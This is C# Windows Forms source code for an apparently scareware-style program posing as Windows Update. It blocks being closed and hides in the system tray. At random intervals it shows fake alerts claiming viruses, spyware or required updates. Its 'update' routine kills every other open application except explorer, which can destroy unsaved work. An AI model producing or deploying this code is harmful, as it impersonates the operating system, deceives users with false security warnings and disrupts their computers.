using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsUpdate
{
    public partial class MainForm : Form
    {
        private bool Notif = false;
        public Thread pubThread;

        public MainForm()
        {
            InitializeComponent();
        }

        private void hide()
        {
            Hide();
            SysTray();
            pubThread = new Thread(StartNotif);
            pubThread.Start();
        }

        private void StartUpdate()
        {
            // https://stackoverflow.com/questions/1286206/how-to-close-all-running-applications-safely-with-c-sharp

            Process me = Process.GetCurrentProcess();
            foreach (Process p in Process.GetProcesses())
            {
                if (p.Id != me.Id && IntPtr.Zero != p.MainWindowHandle && false == p.ProcessName.Equals("explorer", StringComparison.CurrentCultureIgnoreCase) && p.HasExited == false)
                {
                    try
                    {
                        p.Kill();
                    }
                    catch
                    {
                        // do nothing, as errors are normal, but try to close the main window
                        try
                        {
                            p.CloseMainWindow();
                        }
                        catch
                        {
                            // again do nothing: if we reach this point, it may be trying to kill a proccess that is admin or system
                        }
                    }
                }
            }
            UpdateForm updateForm = new UpdateForm();
            updateForm.Show();
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            hide();
        }

        private void MainForm_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                hide();
            }
        }

        private void TrayIcon_Click(object sender, System.EventArgs e)
        {
            StopNotif();
            Show();
            WindowState = FormWindowState.Normal;
            Focus();
            TrayIcon.Visible = false;
        }

        private void CancelBtn_Click(object sender, EventArgs e)
        {
            hide();
        }

        private void UpdateBtn_Click(object sender, EventArgs e)
        {
            Hide();
            StartUpdate();
            StopNotif();
        }

        private void SysTray()
        {
            TrayIcon.Visible = true;
        }

        private void StartNotif()
        {
            Notif = true;
            while (Notif == true)
            {
                int num = Shared.rand.Next(0, 6);
                switch (num)
                {
                    case 0:
                        Task.Run(() =>
                        {
                            DialogResult g = MessageBox.Show("A virus has been detected! Update now to remove viruses and increase security", "Windows Update", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                            if (g == DialogResult.Yes)
                            {
                                StopNotif();
                            }
                        });
                        break;
                    case 1:
                        Task.Run(() =>
                        {
                            DialogResult g = MessageBox.Show("Windows is required to update! Update now to continue using Windows.", "Windows Update", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
                            if (g == DialogResult.Yes)
                            {
                                StopNotif();
                            }
                        });
                        break;
                    case 2:
                        Task.Run(() =>
                        {
                            DialogResult g = MessageBox.Show("There could be a security breach on your computer! Upgrade windows now to find out!", "Windows Update", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                            if (g == DialogResult.Yes)
                            {
                                StopNotif();
                            }
                        });
                        break;
                    case 3:
                        Task.Run(() =>
                        {
                            DialogResult g = MessageBox.Show("Upgrade windows defender?", "Windows Update", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                            if (g == DialogResult.Yes)
                            {
                                StopNotif();
                            }
                        });
                        break;
                    case 4:
                        Task.Run(() =>
                        {
                            DialogResult g = MessageBox.Show("SPYWARE DETECTED! Upgrade windows now to protect yourself!", "Windows Update", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                            if (g == DialogResult.Yes)
                            {
                                StopNotif();
                            }
                        });
                        break;
                    case 5:
                        Task.Run(() =>
                        {
                            MessageBox.Show("WINDOWS HAS ENCOUNTERED AN ERROR AND NEEDS TO UPDATE. UPDATE YOUR COMPUTER NOW TO PROTECT YOURSELF FROM VIRUS.", "Windows Update", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            StopNotif();
                        });
                        break;
                    default:
                        break;
                }
                Thread.Sleep(Shared.rand.Next(10000, 20000));
            }
        }

        private void StopNotif()
        {
            Notif = false;
            if (pubThread != null)
            {
                if (pubThread.IsAlive)
                {
                    try
                    {
                        pubThread.Abort();
                    }
#pragma warning disable CS0168 // Variable is declared but never used
                    catch (ThreadAbortException e)
#pragma warning restore CS0168 // Variable is declared but never used
                    {

                    }
                }
            }
            Invoke(new Action(() =>
            {
                Show();
                WindowState = FormWindowState.Normal;
                Focus();
            }));
        }
    }
}
